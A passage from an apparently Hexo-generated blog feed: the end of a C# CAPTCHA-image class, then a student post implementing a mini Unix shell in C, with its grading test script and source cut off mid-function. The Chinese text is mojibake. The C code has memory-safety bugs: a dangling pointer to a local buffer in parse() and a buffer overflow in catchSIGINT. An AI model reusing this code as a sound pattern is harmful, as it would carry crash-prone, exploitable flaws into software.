<span class="comment">//Console.WriteLine(MD5Encrypt(VerificationText));//Only for test</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//ç”ŸæˆéªŒè¯ç å›¾ç‰‡</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">CreateImage</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            map = <span class="keyword">new</span> Bitmap(width, height);</span><br><span class="line">            Graphics g = Graphics.FromImage(map);</span><br><span class="line">            Pen pen = <span class="keyword">new</span> Pen(Color.Black);</span><br><span class="line">            <span class="built_in">string</span>[] font = &#123; <span class="string">&quot;Verdana&quot;</span>, <span class="string">&quot;Microsoft Sans Serif&quot;</span>, <span class="string">&quot;Consolas&quot;</span>, <span class="string">&quot;Arial&quot;</span>, <span class="string">&quot;å®‹ä½“&quot;</span> &#125;;</span><br><span class="line">            Font f = <span class="keyword">new</span> Font(<span class="string">&quot;Arial&quot;</span>, <span class="number">20</span>, FontStyle.Bold);</span><br><span class="line">            g.Clear(Color.White);</span><br><span class="line">            SolidBrush brush = <span class="keyword">new</span> SolidBrush(Color.White);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//ç»˜åˆ¶å¹²æ‰°çº¿æ¡</span></span><br><span class="line">            pen.Width = <span class="number">0.1F</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                pen.Color = RandColor();</span><br><span class="line">                g.DrawLine(pen, RandPoint(), RandPoint());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//ç»˜åˆ¶å¹²æ‰°ç‚¹</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">80</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                Point p = RandPoint();</span><br><span class="line">                map.SetPixel(p.X, p.Y, RandColor());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//ç»˜åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">            SizeF  StringSizeF = g.MeasureString(VerificationText, f);</span><br><span class="line">            PointF StartPoint = <span class="keyword">new</span> Point(<span class="number">0</span>, (height - (<span class="built_in">int</span>)StringSizeF.Height) / <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                brush.Color = RandColor();</span><br><span class="line">                <span class="built_in">int</span> index = rand.Next(<span class="number">5</span>);</span><br><span class="line">                f = <span class="keyword">new</span> Font(font[index], <span class="number">20</span>, FontStyle.Bold);</span><br><span class="line">                StartPoint.X += <span class="number">5</span>;</span><br><span class="line">                g.DrawString(VerificationText[i].ToString(), f, brush, StartPoint);</span><br><span class="line">                SizeF CharSizeF = g.MeasureString(VerificationText[i].ToString(), f);</span><br><span class="line">                StartPoint.X += CharSizeF.Width;</span><br><span class="line">            &#125;</span><br><span class="line">            g.Dispose();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//ç”Ÿæˆéšæœºé¢œè‰²</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> Color <span class="title">RandColor</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Color c = Color.FromArgb(rand.Next(<span class="number">1</span>, <span class="number">256</span>), rand.Next(<span class="number">1</span>, <span class="number">255</span>), rand.Next(<span class="number">1</span>, <span class="number">255</span>));</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//ç”Ÿæˆéšæœºç‚¹</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> Point <span class="title">RandPoint</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">int</span> x = rand.Next(<span class="number">0</span>, map.Width);</span><br><span class="line">            <span class="built_in">int</span> y = rand.Next(<span class="number">0</span>, map.Height);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Point(x, y);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//è¿”å›éªŒè¯ç å›¾ç‰‡</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Bitmap <span class="title">getImage</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> map;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//è¿”å›ç»MD5åŠ å¯†è¿‡çš„éªŒè¯ç å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">MD5Encrypt</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Tool.MD5Encrypt(VerificationText);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//è¿”å›æ ¡éªŒç»“æœ</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">bool</span> <span class="title">Check</span>(<span class="params"><span class="built_in">string</span> text</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> text.ToUpper().Equals(VerificationText.ToUpper());<span class="comment">//ä¸åŒºåˆ†å¤§å°å†™</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>C#</category>
      </categories>
      <tags>
        <tag>C#</tag>
        <tag>.NET</tag>
      </tags>
  </entry>
  <entry>
    <title>Cè¯­è¨€å®ç°ä¸€ä¸ªè¿·ä½ Shell</title>
    <url>/posts/1118750159/</url>
    <content><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>ä¿„å‹’å†ˆå·ç«‹å¤§å­¦ï¼ˆOregon State University) CS 344ä½œä¸š,ä½¿ç”¨Cè¯­è¨€å®ç°ä¸€ä¸ªShell.</p>
<span id="more"></span>

<h1 id="è¦æ±‚"><a href="#è¦æ±‚" class="headerlink" title="è¦æ±‚"></a>è¦æ±‚</h1><ul>
<li>å†…ç½® <code>cd</code>,<code>status</code>å’Œ<code>exit</code> å‘½ä»¤</li>
<li>æ”¯æŒè¾“å…¥å’Œè¾“å‡ºçš„é‡å®šå‘</li>
<li>æ”¯æŒåå°è¿è¡Œ(&amp;)</li>
<li>Ctrl-Z ä¸ Ctrl-C</li>
<li>è°ƒç”¨ç³»ç»Ÿå…¶ä»–å‘½ä»¤</li>
<li>æ›¿æ¢å‘½ä»¤ä¸­çš„<code>$$</code>ä¸ºShellçš„<code>PID</code></li>
</ul>
<h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><h2 id="ä½œä¸špdf"><a href="#ä½œä¸špdf" class="headerlink" title="ä½œä¸špdf"></a>ä½œä¸špdf</h2><div class="pdf" target="./Program3.pdf" height=""></div>

<h2 id="æµ‹è¯•è„šæœ¬"><a href="#æµ‹è¯•è„šæœ¬" class="headerlink" title="æµ‹è¯•è„šæœ¬"></a>æµ‹è¯•è„šæœ¬</h2><figure class="highlight bash"><figcaption><span>p3testscript</span><a href="/downloads/code/p3testscript">view raw</a></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PRE-SCRIPT INFO&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  Grading Script PID: $$&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;  Note: your smallsh will report a different PID when evaluating $$&#x27;</span></span><br><span class="line"></span><br><span class="line">./smallsh &lt;&lt;<span class="string">&#x27;___EOF___&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> BEGINNING TEST SCRIPT</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> Using comment (5 points <span class="keyword">if</span> only next prompt is displayed next)</span><br><span class="line"><span class="comment">#THIS COMMENT SHOULD DO NOTHING</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">ls</span> (10 points <span class="keyword">for</span> returning <span class="built_in">dir</span> contents)</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">ls</span> out junk</span><br><span class="line"><span class="built_in">ls</span> &gt; junk</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">cat</span> junk (15 points <span class="keyword">for</span> correctly returning contents of junk)</span><br><span class="line"><span class="built_in">cat</span> junk</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">wc</span> <span class="keyword">in</span> junk (15 points <span class="keyword">for</span> returning correct numbers from <span class="built_in">wc</span>)</span><br><span class="line"><span class="built_in">wc</span> &lt; junk</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">wc</span> <span class="keyword">in</span> junk out junk2; <span class="built_in">cat</span> junk2 (10 points <span class="keyword">for</span> returning correct numbers from <span class="built_in">wc</span>)</span><br><span class="line"><span class="built_in">wc</span> &lt; junk &gt; junk2</span><br><span class="line"><span class="built_in">cat</span> junk2</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">test</span> -f badfile (10 points <span class="keyword">for</span> returning error value of 1, note extraneous &amp;)</span><br><span class="line"><span class="built_in">test</span> -f badfile</span><br><span class="line">status &amp;</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">wc</span> <span class="keyword">in</span> badfile (10 points <span class="keyword">for</span> returning text error)</span><br><span class="line"><span class="built_in">wc</span> &lt; badfile</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> badfile (10 points <span class="keyword">for</span> returning text error)</span><br><span class="line">badfile</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">sleep</span> 100 background (10 points <span class="keyword">for</span> returning process ID of sleeper)</span><br><span class="line"><span class="built_in">sleep</span> 100 &amp;</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> pkill -signal SIGTERM <span class="built_in">sleep</span> (10 points <span class="keyword">for</span> pid of killed process, 10 points <span class="keyword">for</span> signal)</span><br><span class="line"><span class="built_in">echo</span> (Ignore message about Operation Not Permitted)</span><br><span class="line">pkill <span class="built_in">sleep</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">sleep</span> 1 background (10 pts <span class="keyword">for</span> pid of <span class="built_in">bg</span> ps when <span class="keyword">done</span>, 10 <span class="keyword">for</span> <span class="built_in">exit</span> value)</span><br><span class="line"><span class="built_in">sleep</span> 1 &amp;</span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">cd</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">pwd</span> (10 points <span class="keyword">for</span> being <span class="keyword">in</span> the HOME <span class="built_in">dir</span>)</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">mkdir</span> testdir$$</span><br><span class="line"><span class="built_in">mkdir</span> testdir$$</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">cd</span> testdir$$</span><br><span class="line"><span class="built_in">cd</span> testdir$$</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">pwd</span> (5 points <span class="keyword">for</span> being <span class="keyword">in</span> the newly created <span class="built_in">dir</span>)</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> Testing foreground-only mode (20 points <span class="keyword">for</span> entry &amp; <span class="built_in">exit</span> text AND ~5 seconds between <span class="built_in">times</span>)</span><br><span class="line"><span class="built_in">kill</span> -SIGTSTP $$</span><br><span class="line"><span class="built_in">date</span></span><br><span class="line"><span class="built_in">sleep</span> 5 &amp;</span><br><span class="line"><span class="built_in">date</span></span><br><span class="line"><span class="built_in">kill</span> -SIGTSTP $$</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">___EOF___</span><br></pre></td></tr></table></figure>

<h1 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h1><figure class="highlight c"><figcaption><span>smallsh.c</span><a href="/downloads/code/smallsh.c">view raw</a></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_INPUT_LENGTH 2048</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ARG_NUMBER 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPLIT_CHAR <span class="string">&quot; \t\r\n&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> allowBg = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">readLine</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> maxLength = MAX_INPUT_LENGTH;</span><br><span class="line">    <span class="type">char</span> *line = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>) * maxLength);</span><br><span class="line">    fgets(line, maxLength, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; maxLength; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (line[i] == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        {</span><br><span class="line">            line[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> line;</span><br><span class="line">}</span><br><span class="line"><span class="type">char</span> **<span class="title function_">parse</span><span class="params">(<span class="type">char</span> *line, <span class="type">int</span> *num, <span class="type">int</span> *back)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> maxNumber = MAX_ARG_NUMBER;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> **arr = (<span class="type">char</span> **)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span> *) * maxNumber);</span><br><span class="line">    <span class="type">char</span> *token;</span><br><span class="line">    token = strtok(line, SPLIT_CHAR);</span><br><span class="line">    <span class="keyword">while</span> (token != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        arr[i] = token;</span><br><span class="line">        <span class="comment">// replace $$</span></span><br><span class="line">        <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(arr[i])<span class="number">-1</span>; j++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span> (arr[i][j] == <span class="string">&#x27;$&#x27;</span> &amp;&amp; arr[i][j + <span class="number">1</span>] == <span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">            {</span><br><span class="line">                arr[i][j] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                arr[i][j+<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                <span class="type">char</span> t[<span class="number">10</span>];</span><br><span class="line">                <span class="type">char</span> newArg[<span class="number">50</span>];</span><br><span class="line">                <span class="built_in">memset</span>(t, <span class="string">&#x27;\0&#x27;</span>, <span class="number">10</span>);</span><br><span class="line">                <span class="built_in">memset</span>(newArg, <span class="string">&#x27;\0&#x27;</span>, <span class="number">50</span>);</span><br><span class="line">                <span class="built_in">strncpy</span>(newArg, arr[i], j);</span><br><span class="line">                <span class="built_in">sprintf</span>(t, <span class="string">&quot;%d&quot;</span>, getpid());</span><br><span class="line">                <span class="built_in">strcat</span>(newArg, t);</span><br><span class="line">                <span class="comment">// sprintf(arr[i], newArg);</span></span><br><span class="line">                arr[i] = newArg;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        i++;</span><br><span class="line">        token = strtok(<span class="literal">NULL</span>, SPLIT_CHAR);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= <span class="number">2</span> &amp;&amp; <span class="built_in">strcmp</span>(arr[i - <span class="number">1</span>], <span class="string">&quot;&amp;&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        arr[i - <span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">            i--;</span><br><span class="line">        <span class="keyword">if</span>(allowBg == <span class="number">1</span>){</span><br><span class="line">            *back = <span class="number">1</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    *num = i;</span><br><span class="line">    arr[i] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">printStatus</span><span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (status == <span class="number">0</span> || status == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;exit value %d\n&quot;</span>, status);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;terminated by signal %d\n&quot;</span>, status);</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">catchSIGTSTP</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (allowBg == <span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="type">char</span> *message = <span class="string">&quot;Entering foreground-only mode(&amp; is now ignored)\n&quot;</span>;</span><br><span class="line">        write(STDOUT_FILENO, message, <span class="number">49</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        allowBg = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="type">char</span> *message = <span class="string">&quot;Exiting foreground-only mode\n&quot;</span>;</span><br><span class="line">        write(STDOUT_FILENO, message, <span class="number">30</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        allowBg = <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">catchSIGINT</span><span class="params">(<span class="type">int</span> signo)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> message[] = <span class="string">&quot;terminated by signal &quot;</span>;</span><br><span class="line">    <span class="type">char</span> t[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">memset</span>(t, <span class="string">&#x27;\0&#x27;</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(t, <span class="string">&quot;%d&quot;</span>, signo);</span><br><span class="line">    <span class="built_in">strcat</span>(message, t);</span><br><span class="line">    <span class="built_in">strcat</span>(message, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, message);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">newProcess</span><span class="params">(<span class="type">char</span> **arr, <span class="type">int</span> num, <span class="type">int</span> back)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line">    <span class="type">int</span> status, fd;</span><br><span class="line">    <span class="type">int</span> input_flag = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> output_flag = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arr[i], <span class="string">&quot;&lt;&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">            input_flag = i;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arr[i], <span class="string">&quot;&gt;&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">            output_flag = i;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sigint</span> =</span> {<span class="number">0</span>};</span><br><span class="line">        sigint.sa_handler = catchSIGINT;</span><br><span class="line">        sigemptyset(&amp;sigint.sa_mask);</span><br><span class="line">        sigint.sa_flags = <span class="number">0</span>;</span><br><span class="line">        sigaction(SIGINT, &amp;sigint, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// input redirect</span></span><br><span class="line">        <span class="keyword">if</span> (input_flag &gt; <span class="number">-1</span>)</span><br><span class="line">        {</span><br><span class="line">            fd = open(arr[input_flag + <span class="number">1</span>], O_RDONLY, <span class="number">0644</span>);</span><br><span class="line">            <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;cannot open %s for input\n&quot;</span>, arr[input_flag + <span class="number">1</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (dup2(fd, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">                {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;: Could not redirect stdin for input file %s\n&quot;</span>, arr[input_flag + <span class="number">1</span>]);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                }</span><br><span class="line">                arr[input_flag] = <span class="literal">NULL</span>;</span><br><span class="line">                close(fd);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//output redirect</span></span><br><span class="line">        <span class="keyword">if</span> (output_flag &gt; <span class="number">-1</span>)</span><br><span class="line">        {</span><br><span class="line">            fd = open(arr[output_flag + <span class="number">1</span>], O_WRONLY | O_CREAT | O_TRUNC, <span class="number">0644</span>);</span><br><span class="line">            <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;cannot not open %s for output\n&quot;</span>, arr[output_flag + <span class="number">1</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (dup2(fd, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">                {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Could not redirect stdout for output file %s\n&quot;</span>, arr[output_flag + <span class="number">1</span>]);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                }</span><br><span class="line">                arr[output_flag] = <span class="literal">NULL</span>;</span><br><span class="line">                close(fd);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (back == <span class="number">1</span> &amp;&amp; input_flag &lt; <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            fd = open(<span class="string">&quot;/dev/null&quot;</span>, O_RDONLY, <span class="number">0644</span>);</span><br><span class="line">            <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Could not open \&quot;/dev/null\&quot;\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (dup2(fd, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">                {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Could not redirect stdin to \&quot;/dev/null\&quot;\n&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                }</span><br><span class="line">                close(fd);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// printf(&quot;%c\n&quot;, arr[0][0]);</span></span><br><span class="line">        <span class="keyword">if</span> (execvp(arr[<span class="number">0</span>], arr) == <span class="number">-1</span> &amp;&amp; arr[<span class="number">0</span>][<span class="number">0</span>] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; arr[<span class="number">0</span>][<span class="number">0</span>] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: no such file or directory\n&quot;</span>, arr[<span class="number">0</span>]);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Smallsh !\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    { <span class="comment">// parent</span></span><br><span class="line">        <span class="keyword">if</span> (back == <span class="number">1</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Background pid is %d.\n&quot;</span>, pid);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            waitpid(pid, &amp;status, WUNTRACED);</span><br><span class="line">            <span class="keyword">if</span> (WIFEXITED(status))</span><br><span class="line">                <span class="keyword">return</span> (WEXITSTATUS(status));</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> 